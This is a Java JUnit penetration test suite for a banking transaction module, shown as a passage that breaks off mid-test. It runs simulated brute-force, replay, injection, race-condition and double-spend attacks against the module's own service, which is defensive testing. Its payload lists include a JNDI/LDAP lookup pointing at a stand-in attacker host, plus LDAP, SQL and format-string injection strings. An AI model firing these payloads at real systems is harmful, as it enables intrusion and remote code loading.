package com.fep.transaction.security;

import com.fep.transaction.config.TransactionModule;
import com.fep.transaction.config.TransactionModuleConfig;
import com.fep.transaction.domain.TransactionRequest;
import com.fep.transaction.domain.TransactionResponse;
import com.fep.transaction.enums.TransactionType;
import com.fep.transaction.exception.TransactionException;
import com.fep.transaction.service.TransactionService;
import org.junit.jupiter.api.*;

import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 滲透測試類別 - 驗證系統對各種攻擊的防護能力
 *
 * 測試場景：
 * 1. 認證攻擊測試 - 暴力破解、重放攻擊、Session 固定
 * 2. 授權繞過測試 - 權限提升、越權存取、強制瀏覽
 * 3. 注入攻擊測試 - 欄位溢出、格式字串、二進位注入
 * 4. 協議層攻擊測試 - 電文篡改、MAC 偽造、電文重送
 * 5. 業務邏輯攻擊測試 - 競態條件、金額竄改、雙重支付
 * 6. DoS 防護測試 - 大量請求、資源耗盡、異常封包
 *
 * 使用 @Tag("penetration") 標記
 * 執行方式：mvn test -Dgroups=penetration
 */
@Tag("penetration")
@DisplayName("Penetration Tests - Security Attack Validation")
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
class PenetrationTest {

    private TransactionModule module;
    private TransactionService transactionService;

    @BeforeEach
    void setUp() {
        module = TransactionModuleConfig.moduleBuilder().build();
        transactionService = module.getTransactionService();
    }

    @AfterEach
    void tearDown() {
        if (module != null) {
            module.shutdown();
        }
    }

    // ==================== 1. 認證攻擊測試 ====================

    @Nested
    @DisplayName("Authentication Attack Tests")
    @Order(1)
    class AuthenticationAttackTests {

        @Test
        @DisplayName("1.1 暴力破解 PIN 碼測試")
        void testBruteForcePinAttack() {
            System.out.println("\n=== 認證攻擊：暴力破解 PIN 碼 ===");

            String cardNumber = "4111111111111111";
            int attemptCount = 0;
            int maxAttempts = 10; // 模擬 10 次暴力破解嘗試

            // 常見 PIN 碼嘗試序列
            String[] commonPins = {
                "1234567890ABCDEF", // PIN: 1234
                "0000567890ABCDEF", // PIN: 0000
                "9999567890ABCDEF", // PIN: 9999
                "1111567890ABCDEF", // PIN: 1111
                "2222567890ABCDEF", // PIN: 2222
                "5555567890ABCDEF", // PIN: 5555
                "6789567890ABCDEF", // PIN: 6789
                "1212567890ABCDEF", // PIN: 1212
                "4321567890ABCDEF", // PIN: 4321
                "7890567890ABCDEF"  // PIN: 7890
            };

            for (String pinBlock : commonPins) {
                attemptCount++;
                System.out.println("嘗試 #" + attemptCount + ": " + pinBlock.substring(0, 4));

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.WITHDRAWAL)
                        .pan(cardNumber)
                        .pinBlock(pinBlock)
                        .amount(new BigDecimal("1000"))
                        .build();

                TransactionResponse response = transactionService.process(request);

                // 驗證系統應該拒絕錯誤的 PIN 碼
                if (response.isApproved()) {
                    System.out.println("  [安全警告] PIN 驗證通過 - 可能存在安全漏洞");
                } else {
                    System.out.println("  正確拒絕: " + response.getResponseCode());
                }

                // 驗證是否有帳號鎖定機制
                if (attemptCount >= 3) {
                    String expectedCode = response.getResponseCode();
                    System.out.println("  第 " + attemptCount + " 次失敗，回應碼: " + expectedCode);

                    // 檢查是否觸發帳號鎖定（通常在 3-5 次失敗後）
                    if ("119".equals(expectedCode) || "208".equals(expectedCode)) {
                        System.out.println("  [安全機制] 偵測到帳號鎖定機制");
                        break;
                    }
                }

                // 模擬攻擊間隔
                try {
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }

            System.out.println("暴力破解嘗試總數: " + attemptCount);
            assertTrue(attemptCount <= maxAttempts, "應該在合理次數內停止");
        }

        @Test
        @DisplayName("1.2 重放攻擊 (Replay Attack) 測試")
        void testReplayAttack() {
            System.out.println("\n=== 認證攻擊：重放攻擊 ===");

            // 第一次正常交易
            String transactionId = "REPLAY-TEST-" + System.currentTimeMillis();
            String rrn = "123456789012";
            String stan = "123456";

            TransactionRequest originalRequest = createBaseRequest()
                    .transactionId(transactionId)
                    .transactionType(TransactionType.BALANCE_INQUIRY)
                    .rrn(rrn)
                    .stan(stan)
                    .build();

            System.out.println("發送原始交易...");
            TransactionResponse response1 = transactionService.process(originalRequest);
            System.out.println("  結果: " + response1.getResponseCode());

            // 嘗試重放相同的交易（使用相同的 RRN 和 STAN）
            System.out.println("\n嘗試重放相同交易 (相同 RRN/STAN)...");

            for (int i = 1; i <= 3; i++) {
                System.out.println("重放嘗試 #" + i);

                TransactionRequest replayRequest = createBaseRequest()
                        .transactionId(transactionId + "-REPLAY-" + i)
                        .transactionType(TransactionType.BALANCE_INQUIRY)
                        .rrn(rrn)  // 相同的 RRN
                        .stan(stan) // 相同的 STAN
                        .build();

                TransactionResponse replayResponse = transactionService.process(replayRequest);
                System.out.println("  結果: " + replayResponse.getResponseCode());

                // 檢查是否被識別為重複交易
                if ("94".equals(replayResponse.getResponseCode()) ||
                    "208".equals(replayResponse.getResponseCode())) {
                    System.out.println("  [安全機制] 重放攻擊被正確識別");
                } else if (replayResponse.isApproved()) {
                    System.out.println("  [安全警告] 重放攻擊未被偵測");
                }

                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        }

        @Test
        @DisplayName("1.3 Session 固定攻擊測試")
        void testSessionFixationAttack() {
            System.out.println("\n=== 認證攻擊：Session 固定攻擊 ===");

            // 攻擊者嘗試使用預設的 Session ID
            String[] maliciousSessionIds = {
                "00000000-0000-0000-0000-000000000000",
                "12345678-1234-1234-1234-123456789012",
                "AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA",
                "admin",
                "session123",
                "test"
            };

            for (String sessionId : maliciousSessionIds) {
                System.out.println("測試惡意 Session ID: " + sessionId);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.BALANCE_INQUIRY)
                        .additionalData("SESSION_ID=" + sessionId)
                        .build();

                assertDoesNotThrow(() -> {
                    TransactionResponse response = transactionService.process(request);
                    assertNotNull(response);
                    System.out.println("  結果: " + response.getResponseCode());

                    // 驗證系統不應接受預設或可預測的 Session ID
                    if (response.isApproved()) {
                        System.out.println("  [安全警告] 可能接受了固定的 Session ID");
                    }
                });
            }
        }

        @Test
        @DisplayName("1.4 時間戳記操控測試")
        void testTimestampManipulation() {
            System.out.println("\n=== 認證攻擊：時間戳記操控 ===");

            // 測試未來時間戳記
            System.out.println("測試未來時間戳記...");
            TransactionRequest futureRequest = createBaseRequest()
                    .transactionType(TransactionType.WITHDRAWAL)
                    .requestTime(java.time.LocalDateTime.now().plusYears(100)) // 未來時間
                    .amount(new BigDecimal("1000"))
                    .build();

            TransactionResponse futureResponse = transactionService.process(futureRequest);
            System.out.println("  結果: " + futureResponse.getResponseCode());

            // 測試過期時間戳記
            System.out.println("測試過期時間戳記...");
            TransactionRequest expiredRequest = createBaseRequest()
                    .transactionType(TransactionType.WITHDRAWAL)
                    .requestTime(java.time.LocalDateTime.of(2000, 1, 1, 0, 0)) // 過期時間
                    .amount(new BigDecimal("1000"))
                    .build();

            TransactionResponse expiredResponse = transactionService.process(expiredRequest);
            System.out.println("  結果: " + expiredResponse.getResponseCode());

            // 驗證時間戳記應該在合理範圍內
            if (!futureResponse.isApproved() || !expiredResponse.isApproved()) {
                System.out.println("  [安全機制] 時間戳記驗證正常");
            }
        }
    }

    // ==================== 2. 授權繞過測試 ====================

    @Nested
    @DisplayName("Authorization Bypass Tests")
    @Order(2)
    class AuthorizationBypassTests {

        @Test
        @DisplayName("2.1 權限提升測試")
        void testPrivilegeEscalation() {
            System.out.println("\n=== 授權繞過：權限提升 ===");

            // 嘗試使用一般用戶權限執行管理員操作
            String[] administrativeOperations = {
                "ADMIN_OVERRIDE",
                "FORCE_APPROVE",
                "BYPASS_LIMIT",
                "SYSTEM_CONFIG",
                "USER_MANAGEMENT"
            };

            for (String operation : administrativeOperations) {
                System.out.println("嘗試執行管理員操作: " + operation);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.WITHDRAWAL)
                        .additionalData("OPERATION=" + operation)
                        .amount(new BigDecimal("999999")) // 超過一般限額
                        .build();

                TransactionResponse response = transactionService.process(request);

                if (response.isApproved()) {
                    System.out.println("  [安全警告] 可能存在權限提升漏洞");
                } else {
                    System.out.println("  正確拒絕: " + response.getResponseCode());
                }
            }
        }

        @Test
        @DisplayName("2.2 越權存取測試 (IDOR)")
        void testInsecureDirectObjectReference() {
            System.out.println("\n=== 授權繞過：越權存取 (IDOR) ===");

            String legitimateAccount = "12345678901234";
            String[] targetAccounts = {
                "98765432109876", // 其他用戶帳號
                "11111111111111", // 系統帳號
                "00000000000001", // 管理員帳號
                "99999999999999"  // VIP 帳號
            };

            // 嘗試使用 A 的卡號查詢 B 的帳號
            for (String targetAccount : targetAccounts) {
                System.out.println("嘗試越權查詢帳號: " + targetAccount);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.BALANCE_INQUIRY)
                        .pan("4111111111111111") // A 的卡號
                        .sourceAccount(targetAccount) // B 的帳號
                        .build();

                TransactionResponse response = transactionService.process(request);

                if (response.isApproved()) {
                    System.out.println("  [安全警告] 可能允許越權查詢他人帳號");
                } else {
                    System.out.println("  正確拒絕: " + response.getResponseCode());
                }
            }
        }

        @Test
        @DisplayName("2.3 強制瀏覽測試")
        void testForcedBrowsing() {
            System.out.println("\n=== 授權繞過：強制瀏覽 ===");

            // 嘗試存取未授權的交易類型
            TransactionType[] restrictedTypes = {
                TransactionType.REVERSAL,  // 沖正交易應該有特殊權限
            };

            for (TransactionType type : restrictedTypes) {
                System.out.println("嘗試未授權的交易類型: " + type);

                TransactionRequest request = createBaseRequest()
                        .transactionType(type)
                        .amount(new BigDecimal("5000"))
                        .build();

                assertDoesNotThrow(() -> {
                    TransactionResponse response = transactionService.process(request);
                    assertNotNull(response);
                    System.out.println("  結果: " + response.getResponseCode());
                });
            }
        }

        @Test
        @DisplayName("2.4 交易限額繞過測試")
        void testTransactionLimitBypass() {
            System.out.println("\n=== 授權繞過：交易限額繞過 ===");

            // 嘗試拆分大額交易以繞過限額
            BigDecimal largeAmount = new BigDecimal("1000000"); // 100 萬
            BigDecimal splitAmount = new BigDecimal("9999"); // 拆成小額

            System.out.println("嘗試單筆大額交易: " + largeAmount);
            TransactionRequest largeRequest = createBaseRequest()
                    .transactionType(TransactionType.WITHDRAWAL)
                    .amount(largeAmount)
                    .build();

            TransactionResponse largeResponse = transactionService.process(largeRequest);
            System.out.println("  結果: " + largeResponse.getResponseCode());

            // 嘗試短時間內多筆小額交易
            System.out.println("\n嘗試拆分為多筆小額交易...");
            int successCount = 0;
            int attemptCount = 20;

            for (int i = 0; i < attemptCount; i++) {
                TransactionRequest splitRequest = createBaseRequest()
                        .transactionId("SPLIT-" + System.currentTimeMillis() + "-" + i)
                        .transactionType(TransactionType.WITHDRAWAL)
                        .amount(splitAmount)
                        .stan(String.format("%06d", i))
                        .rrn(String.format("999999%06d", i))
                        .build();

                TransactionResponse splitResponse = transactionService.process(splitRequest);

                if (splitResponse.isApproved()) {
                    successCount++;
                }

                if (i > 0 && i % 5 == 0) {
                    System.out.println("  已執行 " + i + " 筆，成功 " + successCount + " 筆");
                }
            }

            System.out.println("總計: " + attemptCount + " 筆嘗試，" + successCount + " 筆成功");
            System.out.println("累計金額: " + splitAmount.multiply(new BigDecimal(successCount)));

            // 驗證是否有日累計限額控制
            if (successCount == attemptCount) {
                System.out.println("  [安全警告] 可能缺少日累計限額控制");
            } else {
                System.out.println("  [安全機制] 日累計限額控制正常");
            }
        }
    }

    // ==================== 3. 注入攻擊測試 ====================

    @Nested
    @DisplayName("Injection Attack Tests")
    @Order(3)
    class InjectionAttackTests {

        @Test
        @DisplayName("3.1 欄位溢出攻擊")
        void testBufferOverflowAttack() {
            System.out.println("\n=== 注入攻擊：欄位溢出 ===");

            // 測試各種長度的溢出
            int[] overflowLengths = {1000, 5000, 10000, 50000, 100000};

            for (int length : overflowLengths) {
                System.out.println("測試溢出長度: " + length);

                String overflowData = "A".repeat(length);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.BALANCE_INQUIRY)
                        .additionalData(overflowData)
                        .build();

                assertDoesNotThrow(() -> {
                    try {
                        TransactionResponse response = transactionService.process(request);
                        assertNotNull(response);
                        System.out.println("  處理成功: " + response.getResponseCode());
                    } catch (Exception e) {
                        System.out.println("  正確拒絕: " + e.getClass().getSimpleName());
                    }
                }, "溢出攻擊不應導致系統崩潰");
            }
        }

        @Test
        @DisplayName("3.2 格式字串攻擊")
        void testFormatStringAttack() {
            System.out.println("\n=== 注入攻擊：格式字串 ===");

            String[] formatStringPayloads = {
                "%s%s%s%s%s%s%s%s%s%s",
                "%x%x%x%x%x%x%x%x%x%x",
                "%n%n%n%n%n%n%n%n%n%n",
                "%08x.%08x.%08x.%08x",
                "%d%d%d%d%d%d%d%d%d%d",
                "${java:version}",
                "${jndi:ldap://evil.com/a}",
                "%p%p%p%p%p%p%p%p%p%p"
            };

            for (String payload : formatStringPayloads) {
                System.out.println("測試格式字串: " + payload);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.BALANCE_INQUIRY)
                        .merchantId(payload)
                        .additionalData(payload)
                        .build();

                assertDoesNotThrow(() -> {
                    TransactionResponse response = transactionService.process(request);
                    assertNotNull(response);

                    // 驗證回應中不應包含格式化後的敏感資訊
                    String description = response.getResponseDescription();
                    if (description != null) {
                        assertFalse(description.matches(".*0x[0-9a-fA-F]+.*"),
                                "回應不應包含記憶體位址");
                        assertFalse(description.contains("java.version"),
                                "回應不應洩漏系統資訊");
                    }

                    System.out.println("  安全處理: " + response.getResponseCode());
                });
            }
        }

        @Test
        @DisplayName("3.3 二進位注入測試")
        void testBinaryInjection() {
            System.out.println("\n=== 注入攻擊：二進位注入 ===");

            // 測試各種二進位控制字元
            byte[] controlCharacters = {
                0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                0x08, 0x0B, 0x0C, 0x0E, 0x0F, 0x10, 0x1B, 0x7F
            };

            for (byte controlChar : controlCharacters) {
                System.out.println("測試控制字元: 0x" + String.format("%02X", controlChar));

                String binaryPayload = "TEST" + (char) controlChar + "DATA";

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.BALANCE_INQUIRY)
                        .additionalData(binaryPayload)
                        .build();

                assertDoesNotThrow(() -> {
                    TransactionResponse response = transactionService.process(request);
                    assertNotNull(response);
                    System.out.println("  處理: " + response.getResponseCode());
                });
            }
        }

        @Test
        @DisplayName("3.4 LDAP 注入測試")
        void testLdapInjection() {
            System.out.println("\n=== 注入攻擊：LDAP 注入 ===");

            String[] ldapPayloads = {
                "*",
                "*)(uid=*",
                "admin)(|(password=*",
                "*)(objectClass=*",
                "\\*)(uid=\\*",
                "*()|&",
                "admin)(!(&(1=0",
                "*))%00"
            };

            for (String payload : ldapPayloads) {
                System.out.println("測試 LDAP payload: " + payload);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.BALANCE_INQUIRY)
                        .merchantId(payload)
                        .build();

                assertDoesNotThrow(() -> {
                    TransactionResponse response = transactionService.process(request);
                    assertNotNull(response);
                    System.out.println("  處理: " + response.getResponseCode());
                });
            }
        }
    }

    // ==================== 4. 協議層攻擊測試 ====================

    @Nested
    @DisplayName("Protocol Layer Attack Tests")
    @Order(4)
    class ProtocolAttackTests {

        @Test
        @DisplayName("4.1 ISO 8583 電文篡改測試")
        void testMessageTampering() {
            System.out.println("\n=== 協議攻擊：ISO 8583 電文篡改 ===");

            // 嘗試篡改關鍵欄位
            System.out.println("測試金額欄位篡改...");
            TransactionRequest request1 = createBaseRequest()
                    .transactionType(TransactionType.WITHDRAWAL)
                    .amount(new BigDecimal("1000"))
                    .additionalData("TAMPERED_AMOUNT=999999") // 嘗試在額外資料中夾帶竄改金額
                    .build();

            TransactionResponse response1 = transactionService.process(request1);
            System.out.println("  結果: " + response1.getResponseCode());

            // 測試 Processing Code 篡改
            System.out.println("\n測試 Processing Code 篡改...");
            String[] maliciousProcessingCodes = {
                "000000", // 嘗試更改交易類型
                "999999", // 無效代碼
                "310000\u0000200000", // Null byte injection
                "310000' OR '1'='1" // SQL injection in processing code
            };

            for (String procCode : maliciousProcessingCodes) {
                System.out.println("測試 Processing Code: " + procCode);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.WITHDRAWAL)
                        .processingCode(procCode)
                        .amount(new BigDecimal("1000"))
                        .build();

                TransactionResponse response = transactionService.process(request);
                System.out.println("  結果: " + response.getResponseCode());
            }
        }

        @Test
        @DisplayName("4.2 MAC 偽造測試")
        void testMacForgery() {
            System.out.println("\n=== 協議攻擊：MAC 偽造 ===");

            // 嘗試使用偽造的 MAC
            String[] forgedMacs = {
                "0000000000000000", // 全零 MAC
                "FFFFFFFFFFFFFFFF", // 全 F MAC
                "1234567890ABCDEF", // 隨機 MAC
                "0123456789ABCDEF", // 順序 MAC
                "DEADBEEFDEADBEEF", // 特徵 MAC
                ""                  // 空 MAC
            };

            for (String forgedMac : forgedMacs) {
                System.out.println("測試偽造 MAC: " + forgedMac);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.WITHDRAWAL)
                        .additionalData("MAC=" + forgedMac)
                        .amount(new BigDecimal("1000"))
                        .build();

                TransactionResponse response = transactionService.process(request);

                if (response.isApproved()) {
                    System.out.println("  [安全警告] 偽造 MAC 可能被接受");
                } else {
                    System.out.println("  正確拒絕: " + response.getResponseCode());
                }
            }
        }

        @Test
        @DisplayName("4.3 電文重送攻擊測試")
        void testMessageRetransmissionAttack() {
            System.out.println("\n=== 協議攻擊：電文重送攻擊 ===");

            String baseTransactionId = "RETRANS-" + System.currentTimeMillis();
            String rrn = "888888888888";
            String stan = "888888";

            // 發送原始交易
            System.out.println("發送原始交易...");
            TransactionRequest originalRequest = createBaseRequest()
                    .transactionId(baseTransactionId)
                    .transactionType(TransactionType.WITHDRAWAL)
                    .rrn(rrn)
                    .stan(stan)
                    .amount(new BigDecimal("5000"))
                    .build();

            TransactionResponse originalResponse = transactionService.process(originalRequest);
            System.out.println("  原始交易結果: " + originalResponse.getResponseCode());

            // 快速重送相同電文（模擬網路重送）
            System.out.println("\n快速重送相同電文 (5 次)...");
            int retransmissionCount = 5;
            int acceptedCount = 0;

            for (int i = 1; i <= retransmissionCount; i++) {
                System.out.println("重送 #" + i);

                TransactionRequest retransRequest = createBaseRequest()
                        .transactionId(baseTransactionId) // 相同 Transaction ID
                        .transactionType(TransactionType.WITHDRAWAL)
                        .rrn(rrn)
                        .stan(stan)
                        .amount(new BigDecimal("5000"))
                        .build();

                TransactionResponse retransResponse = transactionService.process(retransRequest);
                System.out.println("  結果: " + retransResponse.getResponseCode());

                if (retransResponse.isApproved()) {
                    acceptedCount++;
                }

                // 極短間隔模擬網路抖動
                try {
                    Thread.sleep(10);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }

            System.out.println("重送攻擊結果: " + acceptedCount + "/" + retransmissionCount + " 被接受");

            if (acceptedCount > 1) {
                System.out.println("  [安全警告] 可能存在重複交易漏洞");
            } else {
                System.out.println("  [安全機制] 重複交易防護正常");
            }
        }

        @Test
        @DisplayName("4.4 電文欄位順序篡改測試")
        void testFieldOrderTampering() {
            System.out.println("\n=== 協議攻擊：電文欄位順序篡改 ===");

            // 正常順序交易
            TransactionRequest normalRequest = createBaseRequest()
                    .transactionType(TransactionType.WITHDRAWAL)
                    .amount(new BigDecimal("1000"))
                    .build();

            System.out.println("測試正常順序電文...");
            TransactionResponse normalResponse = transactionService.process(normalRequest);
            System.out.println("  結果: " + normalResponse.getResponseCode());

            // 嘗試在 Additional Data 中注入欄位順序指令
            String[] orderTamperingPayloads = {
                "FIELD_ORDER=4,2,3,12,7", // 嘗試改變欄位順序
                "SWAP_FIELDS=4<->5", // 嘗試交換欄位
                "BITMAP_OVERRIDE=1111111111111111" // 嘗試覆寫 Bitmap
            };

            for (String payload : orderTamperingPayloads) {
                System.out.println("測試欄位順序篡改: " + payload);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.WITHDRAWAL)
                        .amount(new BigDecimal("1000"))
                        .additionalData(payload)
                        .build();

                TransactionResponse response = transactionService.process(request);
                System.out.println("  結果: " + response.getResponseCode());
            }
        }
    }

    // ==================== 5. 業務邏輯攻擊測試 ====================

    @Nested
    @DisplayName("Business Logic Attack Tests")
    @Order(5)
    class BusinessLogicAttackTests {

        @Test
        @DisplayName("5.1 競態條件攻擊 (Race Condition)")
        void testRaceConditionAttack() throws InterruptedException {
            System.out.println("\n=== 業務邏輯攻擊：競態條件 ===");

            String cardNumber = "4111111111111111";
            String accountNumber = "12345678901234";
            int threadCount = 10;
            CountDownLatch startLatch = new CountDownLatch(1);
            CountDownLatch endLatch = new CountDownLatch(threadCount);
            AtomicInteger successCount = new AtomicInteger(0);
            AtomicInteger failCount = new AtomicInteger(0);

            System.out.println("啟動 " + threadCount + " 個並發交易...");

            // 創建多個並發交易，嘗試同時提款
            ExecutorService executor = Executors.newFixedThreadPool(threadCount);

            for (int i = 0; i < threadCount; i++) {
                final int threadId = i;
                executor.submit(() -> {
                    try {
                        // 等待所有線程準備就緒
                        startLatch.await();

                        TransactionRequest request = createBaseRequest()
                                .transactionId("RACE-" + System.currentTimeMillis() + "-" + threadId)
                                .transactionType(TransactionType.WITHDRAWAL)
                                .pan(cardNumber)
                                .sourceAccount(accountNumber)
                                .amount(new BigDecimal("10000"))
                                .stan(String.format("%06d", threadId))
                                .rrn(String.format("777777%06d", threadId))
                                .build();

                        TransactionResponse response = transactionService.process(request);

                        if (response.isApproved()) {
                            successCount.incrementAndGet();
                            System.out.println("  Thread " + threadId + ": 成功");
                        } else {
                            failCount.incrementAndGet();
                            System.out.println("  Thread " + threadId + ": 拒絕 - " +
                                             response.getResponseCode());
                        }
                    } catch (Exception e) {
                        failCount.incrementAndGet();
                        System.out.println("  Thread " + threadId + ": 異常 - " +
                                         e.getClass().getSimpleName());
                    } finally {
                        endLatch.countDown();
                    }
                });
            }

            // 同時啟動所有交易
            startLatch.countDown();

            // 等待所有交易完成
            boolean completed = endLatch.await(30, TimeUnit.SECONDS);
            executor.shutdown();

            System.out.println("\n並發交易結果:");
            System.out.println("  - 成功: " + successCount.get());
            System.out.println("  - 失敗: " + failCount.get());
            System.out.println("  - 總計金額: " + new BigDecimal("10000").multiply(
                new BigDecimal(successCount.get())));

            assertTrue(completed, "所有交易應該在時限內完成");

            // 驗證並發控制
            if (successCount.get() == threadCount) {
                System.out.println("  [安全警告] 所有並發交易都成功，可能缺少並發控制");
            } else if (successCount.get() <= 1) {
                System.out.println("  [安全機制] 並發控制正常");
            } else {
                System.out.println("  [安全警告] 部分並發交易成功，可能存在競態條件");
            }
        }

        @Test
        @DisplayName("5.2 交易金額竄改測試")
        void testAmountManipulation() {
            System.out.println("\n=== 業務邏輯攻擊：交易金額竄改 ===");

            // 測試各種金額竄改手法
            System.out.println("測試負數金額竄改...");
            TransactionRequest negativeRequest = createBaseRequest()
                    .transactionType(TransactionType.WITHDRAWAL)
                    .amount(new BigDecimal("-5000")) // 負數提款 = 存款？
                    .build();

            TransactionResponse negativeResponse = transactionService.process(negativeRequest);
            System.out.println("  結果: " + negativeResponse.getResponseCode());

            // 測試小數點精度操控
            System.out.println("\n測試小數點精度操控...");
            BigDecimal[] precisionAmounts = {
                new BigDecimal("1000.004"), // 無條件進位可能變 1001
                new BigDecimal("1000.005"), // 四捨五入可能變 1001
                new BigDecimal("0.999"),    // 小於 1 元
                new BigDecimal("1000.9999") // 多位小數
            };

            for (BigDecimal amount : precisionAmounts) {
                System.out.println("測試金額: " + amount);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.WITHDRAWAL)
                        .amount(amount)
                        .build();

                TransactionResponse response = transactionService.process(request);
                System.out.println("  結果: " + response.getResponseCode());
            }

            // 測試溢位攻擊
            System.out.println("\n測試整數溢位...");
            BigDecimal maxValue = new BigDecimal("999999999999.99");
            TransactionRequest overflowRequest = createBaseRequest()
                    .transactionType(TransactionType.WITHDRAWAL)
                    .amount(maxValue)
                    .build();

            TransactionResponse overflowResponse = transactionService.process(overflowRequest);
            System.out.println("  結果: " + overflowResponse.getResponseCode());
        }

        @Test
        @DisplayName("5.3 帳戶餘額操控測試")
        void testBalanceManipulation() {
            System.out.println("\n=== 業務邏輯攻擊：帳戶餘額操控 ===");

            String accountNumber = "12345678901234";

            // 測試餘額查詢後立即大額提款
            System.out.println("步驟 1: 查詢餘額...");
            TransactionRequest inquiryRequest = createBaseRequest()
                    .transactionType(TransactionType.BALANCE_INQUIRY)
                    .sourceAccount(accountNumber)
                    .build();

            TransactionResponse inquiryResponse = transactionService.process(inquiryRequest);
            System.out.println("  結果: " + inquiryResponse.getResponseCode());

            // 立即嘗試大額提款（假設攻擊者知道餘額）
            System.out.println("\n步驟 2: 立即大額提款...");
            TransactionRequest withdrawalRequest = createBaseRequest()
                    .transactionType(TransactionType.WITHDRAWAL)
                    .sourceAccount(accountNumber)
                    .amount(new BigDecimal("999999"))
                    .build();

            TransactionResponse withdrawalResponse = transactionService.process(withdrawalRequest);
            System.out.println("  結果: " + withdrawalResponse.getResponseCode());

            // 測試跨帳戶轉帳時的金額一致性
            System.out.println("\n步驟 3: 測試轉帳金額一致性...");
            TransactionRequest transferRequest = createBaseRequest()
                    .transactionType(TransactionType.TRANSFER)
                    .sourceAccount(accountNumber)
                    .destinationAccount("98765432109876")
                    .destinationBankCode("012")
                    .amount(new BigDecimal("50000"))
                    .additionalData("DEBIT_AMOUNT=50000;CREDIT_AMOUNT=60000") // 嘗試不對稱金額
                    .build();

            TransactionResponse transferResponse = transactionService.process(transferRequest);
            System.out.println("  結果: " + transferResponse.getResponseCode());
        }

        @Test
        @DisplayName("5.4 雙重支付攻擊測試")
        void testDoubleSpendingAttack() {
            System.out.println("\n=== 業務邏輯攻擊：雙重支付 ===");

            String accountNumber = "12345678901234";
            BigDecimal amount = new BigDecimal("10000");

            // 第一筆交易
            System.out.println("發送第一筆交易...");
            String baseRrn = "111111111111";
            String baseStan = "111111";

            TransactionRequest request1 = createBaseRequest()
                    .transactionId("DOUBLE-1-" + System.currentTimeMillis())
                    .transactionType(TransactionType.WITHDRAWAL)
                    .sourceAccount(accountNumber)
                    .amount(amount)
                    .rrn(baseRrn)
                    .stan(baseStan)
                    .build();

            TransactionResponse response1 = transactionService.process(request1);
            System.out.println("  第一筆結果: " + response1.getResponseCode());

            // 嘗試使用不同的 Transaction ID 但相同金額、帳號再次交易
            System.out.println("\n發送第二筆交易 (不同 ID，相同金額和帳號)...");
            TransactionRequest request2 = createBaseRequest()
                    .transactionId("DOUBLE-2-" + System.currentTimeMillis())
                    .transactionType(TransactionType.WITHDRAWAL)
                    .sourceAccount(accountNumber)
                    .amount(amount)
                    .rrn("111111111112") // 不同 RRN
                    .stan("111112")      // 不同 STAN
                    .build();

            TransactionResponse response2 = transactionService.process(request2);
            System.out.println("  第二筆結果: " + response2.getResponseCode());

            // 極短時間內第三筆
            System.out.println("\n發送第三筆交易 (極短間隔)...");
            TransactionRequest request3 = createBaseRequest()
                    .transactionId("DOUBLE-3-" + System.currentTimeMillis())
                    .transactionType(TransactionType.WITHDRAWAL)
                    .sourceAccount(accountNumber)
                    .amount(amount)
                    .rrn("111111111113")
                    .stan("111113")
                    .build();

            TransactionResponse response3 = transactionService.process(request3);
            System.out.println("  第三筆結果: " + response3.getResponseCode());

            // 分析結果
            int approvedCount = 0;
            if (response1.isApproved()) approvedCount++;
            if (response2.isApproved()) approvedCount++;
            if (response3.isApproved()) approvedCount++;

            System.out.println("\n雙重支付測試結果: " + approvedCount + "/3 交易被核准");

            if (approvedCount > 1) {
                System.out.println("  [安全警告] 偵測到可能的雙重支付漏洞");
            } else {
                System.out.println("  [安全機制] 雙重支付防護正常");
            }
        }

        @Test
        @DisplayName("5.5 交易狀態操控測試")
        void testTransactionStateManipulation() {
            System.out.println("\n=== 業務邏輯攻擊：交易狀態操控 ===");

            // 嘗試直接指定交易狀態
            String[] maliciousStates = {
                "APPROVED",
                "FORCE_APPROVED",
                "BYPASS_VALIDATION",
                "ADMIN_OVERRIDE",
                "STATUS=00"
            };

            for (String state : maliciousStates) {
                System.out.println("嘗試指定交易狀態: " + state);

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.WITHDRAWAL)
                        .amount(new BigDecimal("10000"))
                        .additionalData("STATE=" + state)
                        .build();

                TransactionResponse response = transactionService.process(request);

                if (response.isApproved() && "00".equals(response.getResponseCode())) {
                    System.out.println("  [安全警告] 交易狀態可能被操控");
                } else {
                    System.out.println("  結果: " + response.getResponseCode());
                }
            }
        }
    }

    // ==================== 6. DoS 防護測試 ====================

    @Nested
    @DisplayName("DoS Protection Tests")
    @Order(6)
    class DosProtectionTests {

        @Test
        @DisplayName("6.1 大量請求測試")
        void testFloodAttack() {
            System.out.println("\n=== DoS 防護：大量請求攻擊 ===");

            int requestCount = 100;
            int timeWindowSeconds = 5;
            AtomicInteger successCount = new AtomicInteger(0);
            AtomicInteger throttledCount = new AtomicInteger(0);

            System.out.println("在 " + timeWindowSeconds + " 秒內發送 " + requestCount + " 個請求...");

            long startTime = System.currentTimeMillis();
            ExecutorService executor = Executors.newFixedThreadPool(20);
            CountDownLatch latch = new CountDownLatch(requestCount);

            for (int i = 0; i < requestCount; i++) {
                final int requestId = i;
                executor.submit(() -> {
                    try {
                        TransactionRequest request = createBaseRequest()
                                .transactionId("DOS-" + System.currentTimeMillis() + "-" + requestId)
                                .transactionType(TransactionType.BALANCE_INQUIRY)
